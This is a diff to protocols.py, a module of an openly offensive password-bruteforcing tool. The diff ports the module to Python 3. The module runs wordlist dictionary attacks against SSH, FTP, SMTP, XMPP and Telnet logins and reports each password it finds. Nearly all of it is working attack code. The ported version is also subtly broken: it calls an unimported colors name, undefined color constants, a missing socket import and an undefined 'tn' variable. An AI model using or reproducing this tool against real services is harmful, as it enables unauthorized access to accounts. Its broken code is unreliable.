@@ -1,8 +1,8 @@
-'''
-protocols.py - Core module for network protocol bruteforcing
+"""
+protocols.py
 
-Category: Core
-Description:
+    Core module for network protocol bruteforcing
+
     This module provides the methods for bruteforcing network protocols.
     Using a multitude of Python libraries, protocols attempts to authenticate with
     the specified service through its respective library.
@@ -12,21 +12,16 @@ Description:
     - ftp       Port: 21
     - smtp      Port: 25
     - xmpp      Port: 5222
+"""
 
-Dependencies: smtplib, paramiko, ftplib, telnetlib
+import brute.colors
 
-Version: v1.0.0
-Author: ex0dus
-License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0
-
-'''
-
-from consts import *
-
+import time
 import smtplib
 import paramiko
 import ftplib
 import telnetlib
+
 
 class ProtocolBruteforce:
     def __init__(self, service, address, username, wordlist, port, delay):
@@ -39,10 +34,11 @@ class ProtocolBruteforce:
 
     def execute(self):
         if self.address is None:
-            print R + "[!] You need to provide an address for cracking! [!]" + W
+            colors.error("[!] You need to provide an address for cracking! [!]")
             exit(1)
-        print C + "[*] Address: %s" % self.address + W
-        sleep(0.5)
+
+        print(C + "[*] Address: {}".format(self.address) + W)
+        time.sleep(0.5)
 
         if self.port is None:
             if self.service == "ssh":
@@ -50,20 +46,20 @@ class ProtocolBruteforce:
             elif self.service == "ftp":
                 self.port = 21
             elif self.service == "smtp":
-                print O + "[?] NOTE: SMTP has several ports for usage, including 25, 465, 587" + W
+                colors.warn("[?] NOTE: SMTP has several ports for usage, including 25, 465, 587")
                 self.port = 25
             elif self.service == "telnet":
                 self.port = 23
             elif self.service == "xmpp":
                 self.port = 5222
 
-            print O + "[?] Port not set. Automatically set to %s for you [?]" % self.port
+            colors.warn("[?] Port not set. Automatically set to {} for you [?]".format(self.port))
 
 
-        print C + "[*] Port: %s "  % self.port + W
-        sleep(1)
-        print P + "[*] Starting dictionary attack! [*]" + W
-        print "Using %s seconds of delay. Default is 1 second." % self.delay
+        print(C, "[*] Port: {}".format(self.port), W)
+        time.sleep(1)
+        print(P, "[*] Starting dictionary attack! [*]", W)
+        print("Using {} seconds of delay. Default is 1 second.".format(self.delay))
 
         # Call respective methods
         if self.service == "ssh":
@@ -91,9 +87,8 @@ class ProtocolBruteforce:
         except paramiko.AuthenticationException:
             # Password did not authenticate.
             code = 1
-        except socket.error, e:
-            # Something went wrong.
-            print R + "[!] Error: Connection Failed. [!]" + W
+        except socket.error as e:
+            colors.error("[!] Error: Connection Failed. [!]")
             code = 2
 
         ssh.close()
@@ -107,15 +102,15 @@ class ProtocolBruteforce:
             try:
                 response = self.ssh_connect(address, username, password, port)
                 if response == 0:
-                    print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+                    colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                 elif response == 1:
-                    print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-                    sleep(delay)
+                    colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
+                    time.sleep(delay)
                 elif response == 2:
-                    print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
-                    exit()
+                    colors.error("[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]")
+                    exit(1)
             except Exception as e:
-                print R + ("Error caught! %s" % e) + W
+                colors.error("Error caught! {}".format(e))
                 pass
             except KeyboardInterrupt:
                 exit(1)
@@ -130,15 +125,15 @@ class ProtocolBruteforce:
             try:
                 ftp.connect(address, port)
                 ftp.login(username, password)
-                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+                colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                 ftp.quit()
                 wordlist.close()
                 exit(0)
             except ftplib.error_perm:
-                 print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-                 sleep(delay)
+                 colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
+                 time.sleep(delay)
             except ftplib.all_errors as e:
-                print R + ("Error caught! %s" % e) + W
+                colors.error("Error caught! {}".format(e))
             except KeyboardInterrupt:
                 ftp.quit()
                 wordlist.close()
@@ -154,15 +149,15 @@ class ProtocolBruteforce:
                 s.starttls()
                 s.ehlo
                 s.login(str(username), str(password))
-                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+                colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                 s.close()
                 wordlist.close()
                 exit(0)
             except smtplib.SMTPAuthenticationError:
-                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-                sleep(delay)
+                colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
+                time.sleep(delay)
             except Exception as e:
-                print R + ("Error caught! %s" % e) + W
+                colors.error("Error caught! %s".format(e))
             except KeyboardInterrupt:
                 s.close()
                 wordlist.close()
@@ -177,19 +172,19 @@ class ProtocolBruteforce:
             try:
                 if client.auth(username, password):
                     client.sendInitPresence()
-                    print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+                    colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                     client.disconnect()
                     wordlist.close()
                     exit(0)
             except Exception as e:
-                print R + ("Error caught! Name: %s" % e) + W
+                colors.error("Error caught! Name: {}".format(e))
             except KeyboardInterrupt:
                 client.disconnect()
                 wordlist.close()
                 exit(1)
             except:
-                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-                sleep(delay)
+                colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
+                time.sleep(delay)
 
     def telnetBruteforce(self, address, username, wordlist, port, delay):
         telnet = telnetlib.Telnet(address)
@@ -202,18 +197,18 @@ class ProtocolBruteforce:
                 telnet.read_until("Password: ")
                 telnet.write(password + "\n")
                 tn.write("vt100\n")
-                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+                colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                 telnet.close()
                 wordlist.close()
                 exit(0)
             except socket.error:
-                print R + "[!] Error: Connection Failed. [!]" + W
+                colors.error("[!] Error: Connection Failed. [!]")
             except KeyboardInterrupt:
                 telnet.close()
                 wordlist.close()
                 exit(1)
             except EOFError:
-                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-                sleep(delay)
+                colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
+                time.sleep(delay)
             except Exception as e:
-                print R + ("Error caught! Name: %s" % e) + W
+                colors.error("Error caught! Name: {}".format(e))
